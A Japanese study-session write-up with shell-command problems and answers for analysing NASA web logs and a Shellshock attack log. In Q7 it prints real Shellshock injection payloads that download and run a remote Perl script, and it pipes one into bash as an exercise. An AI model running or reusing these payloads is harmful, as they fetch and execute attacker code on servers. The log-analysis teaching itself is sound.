---
Keywords: ログ,apache,CLI,Linux,shellshock,UNIX/Linuxサーバ,USP友の会,勉強会,シェル芸,シェル芸勉強会
Copyright: (C) 2017 Ryuichi Ueda
---

# 【問題と解答例】第16回春だからログ解析するぞシェル芸勉強会
<a href="http://blog.ueda.asia/?p=5851" title="【問題のみ】第16回春だからログ解析するぞシェル芸勉強会">問題のみのページはコチラ</a>

<h1>始める前に</h1>

<h2>イントロのスライド</h2>

<iframe src="//www.slideshare.net/slideshow/embed_code/key/6Z4FO3TXgFiUjA" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/ryuichiueda/20150418-16" title="20150418 第16回シェル芸勉強会スライド" target="_blank">20150418 第16回シェル芸勉強会スライド</a> </strong> from <strong><a href="//www.slideshare.net/ryuichiueda" target="_blank">Ryuichi Ueda</a></strong> </div>

<!--more-->
<h2>使用するログ</h2>

<a href="http://blog.ueda.asia/?page_id=5649" target="_blank">http://blog.ueda.asia/?page_id=5649</a>内の、access.log_.shellshock.gzとaccess_log.nasa.gzです。

<h2>環境</h2>
今回はLinuxで解答例を作りましたので、BSD系、Macな方は以下の表をご参考に・・・。

<table>
 <tr>
 <th>Mac,BSD系</th>
 <th>Linux</th>
 </tr>
 <tr>
 <td>gdate</td>
 <td>date</td>
 </tr>
 <tr>
 <td>gsed</td>
 <td>sed</td>
 </tr>
 <tr>
 <td>tail -r</td>
 <td>tac</td>
 </tr>
 <tr>
 <td>gtr</td>
 <td>tr</td>
 </tr>
 <tr>
 <td>gfold</td>
 <td>fold</td>
 </tr>
</table>

<h2>準備0</h2>

ログをとってきましょう。

```bash
$ wget http://blog.ueda.asia/misc/access_log.nasa.gz
$ wget http://blog.ueda.asia/wp-content/uploads/2015/04/access.log_.shellshock.gz
```

<h2>準備1</h2>

access.log.shellshock.gzとaccess_log.nasa.gzについて、日付と時刻を次のように正規化しておきましょう。

```bash
###修正前###
ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | head -n 1
199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] &quot;GET /history/apollo/ HTTP/1.0&quot; 200 6245
###修正後###
ueda\@tencore:~/tmp/nasa$ cat access_log | head -n 1
19950701 000001 199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] &quot;GET /history/apollo/ HTTP/1.0&quot; 200 6245
```

<h2>解答</h2>

```bash
ueda\@tencore:~/tmp/nasa$ zcat access_log.nasa.gz | awk '{print $4,$0}' |
 sed 's/^\\[//' | awk '{gsub(/[\\/:]/,&quot; &quot;,$1);print}' |
 awk '{$2=$2==&quot;Jul&quot;?&quot;07&quot;:$2;$2=$2==&quot;Aug&quot;?&quot;08&quot;:$2;print}' |
 sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' &gt; access_log
ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz | awk '{print $4,$0}' |
 sed 's/^\\[//' | awk '{gsub(/[\\/:]/,&quot; &quot;,$1);print}' |
 sed -e 's/Sep/09/' -e 's/Oct/10/' -e 's/Nov/11/' -e 's/Dec/12/' |
 sed 's;^\\(..\\) \\(..\\) \\(....\\) \\(..\\) \\(..\\) \\(..\\);\\3\\2\\1 \\4\\5\\6;' &gt; danger_log
```

ちゃんと変換できているか確認する方法は、例えば次の通り。

```bash
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | uniq | sort -u | less
ueda\@tencore:~/tmp/nasa$ awk '{print $2}' access_log | grep -vE '^[0-9]{6}$'
```


<h2>準備2</h2>

NASAのログを各日付のファイルに分けておきましょう。ログはQ1で作ったものを使います。1,2行目の8桁日付、6桁時刻は残っていても構いません。

<h2>解答</h2>

やり方を知っていれば簡単ですね。

```bash
ueda\@tencore:~/tmp/nasa$ cat access_log | awk '{print $0 &gt; $1}' 
```


<h2>Q1</h2>

NASAのログについて、ステータスコードを抽出して、どのコードがいくつあるか数えてみましょう。

<h2>解答</h2>

NASAのログについては、後ろからフィールドを数える方法を使うことに気づけば簡単です。

```bash
ueda\@tencore:~/tmp/nasa$ awk '{print $(NF-1)}' access_log |
 LANG=C sort | uniq 
c-3100522 200
 73070 302
 266773 304
 15 400
 225 403
 20901 404
 65 500
 41 501
```


<h2>Q2</h2>

NASAのログについて、ファイルを開かずに、ログの多い日を探しだしてみましょう。

<h2>解答</h2>

lsを使ってサイズを見たら開かないでも見当がつきます。

```bash
ueda\@tencore:~/tmp/nasa$ ls -l 1* | sort -k5,5n | tail 
-rw-rw-r-- 1 ueda ueda 9897387 4月 17 15:12 19950830
-rw-rw-r-- 1 ueda ueda 9946946 4月 17 15:12 19950711
-rw-rw-r-- 1 ueda ueda 10478436 4月 17 15:12 19950714
-rw-rw-r-- 1 ueda ueda 10859858 4月 17 15:12 19950707
-rw-rw-r-- 1 ueda ueda 11072693 4月 17 15:12 19950831
-rw-rw-r-- 1 ueda ueda 11242160 4月 17 15:12 19950703
-rw-rw-r-- 1 ueda ueda 11483007 4月 17 15:12 19950712
-rw-rw-r-- 1 ueda ueda 11777820 4月 17 15:12 19950705
-rw-rw-r-- 1 ueda ueda 12583986 4月 17 15:12 19950706
-rw-rw-r-- 1 ueda ueda 16557952 4月 17 15:12 19950713
```


<h2>Q3</h2>

NASAのログについて、（Q3-1）ログの件数が一番多い曜日はどれでしょうか。（Q3-2）ログの件数が一番多い時間帯（時間帯というのは0時台、1時台、・・・、23時台のこと）はどれでしょうか。

Q3-2については高速な方法を考えてみてください。

<h2>解答</h2>

（Q3-1）次のように木曜日。

```bash
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | date -f - &quot;+%w&quot; |
 LANG=C sort | uniq -c | sort -k1,1n
 317276 0
 318046 6
 497456 5
 529960 1
 556590 2
 574547 3
 667737 4
```

（Q3-2）時間をどう切り出すかが鍵です。

```bash
ueda\@tencore:~/tmp/nasa$ awk '{print substr($2,1,2)}' access_log |
 sort | uniq -c | sort -k1,1nr | head
 230665 15
 227228 12
 225350 13
 223873 14
 217564 16
 211064 11
 193816 10
 178664 09
 178443 17
 149193 08
###データが多いと、sortしない分だけこの方が早い###
ueda\@tencore:~/tmp/nasa$ time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |
 sort -k2,2nr | head 
15 230665
12 227228
13 225350
14 223873
16 217564
11 211064
10 193816
09 178664
17 178443
08 149193

real	0m1.448s
user	0m1.387s
sys	0m0.066s
###LANG=Cを指定するとさらに速くなる###
ueda\@tencore:~/tmp/nasa$ LANG=C time awk '{a[substr($2,1,2)]++}END{for(v in a){print v,a[v]}}' access_log |
 sort -k2,2nr | head 
1.24user 0.06system 0:01.30elapsed 99%CPU (0avgtext+0avgdata 1148maxresident)k
0inputs+0outputs (0major+338minor)pagefaults 0swaps
15 230665
12 227228
13 225350
14 223873
16 217564
11 211064
10 193816
09 178664
17 178443
08 149193
```

<h2>Q4</h2>

ShellShockログ内にあるIPアドレス（IPv4）がすべて192.168.から始まることを確認して下さい。IPアドレスはレコードの先頭だけでなく、インジェクションするコードの中にもあるのでご注意ねがいます。

<h2>解答</h2>

```bash
ueda\@remote:~$ zcat access.log.shellshock.gz | grep -Eo '([0-9]+\\.){3}[0-9]+' |
 awk -F. '{print $1,$2}' | uniq
192 168
```

<h2>Q5</h2>

ShellShockログについて、レスポンスのデータ送信量が大きいものを、IPアドレスと共に上から10件を挙げてみましょう。

<h2>解答</h2>

```bash
ueda\@tencore:~/tmp/danger$ zcat access.log.shellshock.gz |
 sed 's/^\\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\) .*&quot; [0-9][0-9][0-9] \\([0-9]\\+\\) &quot;.*$/\\1 \\2/' |
 sort -k2,2nr | head
192.168.0.90 234
192.168.151.207 234
192.168.151.207 234
192.168.151.207 234
192.168.151.207 234
192.168.151.207 234
192.168.151.207 234
192.168.151.207 234
192.168.151.207 234
192.168.193.42 234
```

<h2>Q6</h2>

NASAのログについて、7月8月のうち、ゼロ件の日を列挙してみてください。


<h2>解答</h2>

```bash
###ログの存在しない日（解法1: ツーライナーで）###
ueda\@tencore:~/tmp/nasa$ seq -w 01 31 | awk '{print &quot;199507&quot; $1;print &quot;199508&quot; $1}' | sort &gt; days
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u | cat - days |
 sort | uniq -u
19950729
19950730
19950731
19950802
###Tukubaiでワンライナー###
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |
 cat - <(mdate -e 19950701 19950831)| tarr | sort | uniq -u
19950729
19950730
19950731
19950802
###ガチでワンライナー###
ueda\@tencore:~/tmp/nasa$ awk '{print $1}' access_log | LANG=C sort -u |
 cat - <(echo 19950{7,8}{01..31}) | tr ' ' '\\n' | sort | uniq -u
19950729
19950730
19950731
19950802
```


<h2>Q7</h2>

ShellShockのログから、（Q7-1）インジェクションが試みられたコード（「() { :;};」から後ろ）を抽出してみて傾向を話あってみましょう。（Q7-2）出来る人はエスケープも掃除してコードを復元してみましょう。（Q7-3）更にできる人は最後の行のコードを実行してみてください。<span style="color:red">このログはIPアドレスを変換しているので安全ですが、普通のログでやると死にますのでご注意を。</span>

<h2>解答</h2>

とりあえずこれで読みやすくなりますね。

```bash
###Q7-1 コードを抽出###
ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/'
###Q7-2 コードの掃除###
ueda\@tencore:~/tmp/danger$ cat danger_log | sed 's/^.*()/()/' |
 sed 's/\\\\&quot;/&quot;/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/&quot;$//'
...
() { :;};/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget http://192.168.144.163/guide/lx.pl -O /tmp/lx.pl;curl -O /tmp/lx.pl http://192.168.144.163/guide/lx.pl;perl /tmp/lx.pl;rm -rf /tmp/lx.pl*&quot;);'
() { :;};/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'
###Q7-3 コードの実行（危ない！）###
ueda\@tencore:~/tmp/danger$ tail -n 1 danger_log | sed 's/^.*()/()/' |
 sed 's/\\\\&quot;/&quot;/g' | sed 's/\\\\\\\\/\\\\/g' | sed 's/&quot;$//' |
 sed 's/.........//' | bash -vx
/usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'
+ /usr/bin/perl -e 'print &quot;Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!&quot;;system(&quot;wget -q http://192.168.63.71/android.txt -O /tmp/android.txt;perl /tmp/android.txt;rm -rf /tmp/android*&quot;);'
Content-Type: text/plain

XSUCCESS!
（wgetが失敗するのでCtrl+cで出る。）
```



